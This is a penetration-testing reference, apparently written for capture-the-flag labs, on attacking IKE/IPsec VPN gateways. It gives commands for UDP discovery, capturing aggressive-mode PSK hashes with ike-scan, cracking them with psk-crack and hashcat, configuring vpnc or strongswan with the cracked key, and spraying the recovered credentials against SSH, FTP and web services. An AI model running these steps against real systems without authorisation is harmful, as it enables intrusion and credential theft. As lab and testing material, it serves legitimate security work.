# IKE / IPsec VPN Testing

When you find UDP port 500 (ISAKMP) or 4500 (NAT-T), you're looking at an IPsec VPN endpoint. VPN gateways often have weak pre-shared keys and reuse credentials for other services.

---

## Quick Command Reference

### Discovery

```bash
# Confirm IKE is running
nmap -sU -p 500,4500 <TARGET>

# Get IKE version, auth method, encryption parameters
nmap -sU -p 500 --script=ike-version <TARGET>
```

### ike-scan

```bash
# Main Mode — basic probe (stealthier)
ike-scan -M <TARGET>

# Aggressive Mode — reveals server ID, captures crackable PSK hash
ike-scan -M --aggressive --id=vpngroup <TARGET>

# Common group IDs to try if vpngroup doesn't work:
# vpn, remote, employee, default, <company_name>

# Save PSK hash for cracking (needs root)
sudo bash -c 'ike-scan -M --aggressive --id=vpngroup \
    --pskcrack=/path/to/ike_hash.txt <TARGET>'
```

**Read the response for:**
- `Auth=PSK` — crackable Pre-Shared Key
- `ID(Type=ID_USER_FQDN, Value=ike@hostname.htb)` — server identity (potential username + hostname)
- `XAUTH` — VPN also requires username/password after PSK
- `SA=(Enc=3DES Hash=SHA1 Group=2:modp1024)` — cipher parameters (needed for VPN connection config)

### PSK Cracking

```bash
# psk-crack (comes with ike-scan, fast enough for most cases)
psk-crack -d /usr/share/wordlists/rockyou.txt ike_hash.txt

# hashcat (GPU, faster for large wordlists)
# Mode 5300 = IKEv1, 5400 = IKEv2
hashcat -m 5300 ike_hash.txt /usr/share/wordlists/rockyou.txt
```

### VPN Connection — vpnc

Simplest option for Cisco-style VPNs. Only supports Main Mode.

```bash
cat > vpn.conf << 'EOF'
IPSec gateway <TARGET>
IPSec ID <group_name>
IPSec secret <cracked_PSK>
Xauth username <user>
Xauth password <password>
EOF

sudo vpnc vpn.conf

# Disconnect
sudo vpnc-disconnect
```

### VPN Connection — strongswan

Supports Aggressive Mode. Use when vpnc fails with INVALID_EXCHANGE_TYPE.

```bash
# Write config — match ike= to ike-scan SA output
sudo tee /etc/ipsec.conf << 'EOF'
config setup

conn target
    authby=secret
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    keyexchange=ikev1
    type=tunnel
    left=%defaultroute
    leftid=@<group_name>
    leftauth=psk
    leftauth2=xauth
    right=<TARGET>
    rightauth=psk
    aggressive=yes
    auto=add
    xauth_identity=<user>
EOF

# Write secrets — @ prefix on identity is mandatory
sudo tee /etc/ipsec.secrets << 'EOF'
@<group_name> : PSK "<cracked_PSK>"
<user> : XAUTH "<password>"
EOF

# Connect
sudo ipsec restart && sleep 2 && sudo ipsec up target
```

**Mapping ike-scan output to ipsec.conf:**

| ike-scan SA field | ipsec.conf value |
|-------------------|------------------|
| `Enc=3DES` | `ike=3des-...` |
| `Hash=SHA1` | `ike=...-sha1-...` |
| `Group=2:modp1024` | `ike=...-modp1024!` |
| `Auth=PSK` | `authby=secret` |

The `!` suffix means strict — don't negotiate alternatives, use exactly this cipher.

---

## Credential Reuse from VPN

Before fighting with VPN connection config, try credential reuse on other services first — it's often faster:

1. **Server ID username** (e.g., `ike` from `ike@expressway.htb`) → try as SSH/FTP user
2. **Cracked PSK** → try as password for those usernames
3. **XAUTH credentials** (if found) → try on SSH, FTP, web, DB
4. **Hostname discovered** → add to `/etc/hosts`, check for vhosts

Read `references/credential-reuse.md` for the full spray checklist.

---

## Known Errors

| Error | Tool | Cause | Fix |
|-------|------|-------|-----|
| `ISAKMP_N_INVALID_EXCHANGE_TYPE` | vpnc | Server rejects Main Mode | Switch to strongswan (supports aggressive) |
| `Error binding to source port` | vpnc | Port 500 in use by another process | `sudo ipsec stop` or `sudo killall charon` first |
| `AUTHENTICATION_FAILED` | strongswan | Wrong PSK, wrong ID format, or wrong secrets syntax | Verify `@` prefix on leftid; match secrets format exactly |
| `NO_PROPOSAL_CHOSEN` | strongswan | Cipher mismatch | Match `ike=` exactly to ike-scan SA output |
| `INVALID_ID_INFORMATION` | both | Server doesn't recognize client group name | Try IDs from ike-scan response, common defaults |

---

## Common Mistakes

1. **Skipping UDP scan** — IKE only lives on UDP 500/4500. TCP-only scans miss it entirely.
2. **Not trying aggressive mode** — Main mode doesn't reveal the server ID or PSK hash.
3. **Using the wrong group ID** — If `vpngroup` doesn't work, try: `vpn`, `remote`, `employee`, `default`, or the company name.
4. **Fighting with VPN config when SSH works** — If the PSK works as SSH password, you don't need the VPN at all. Try credential reuse first.
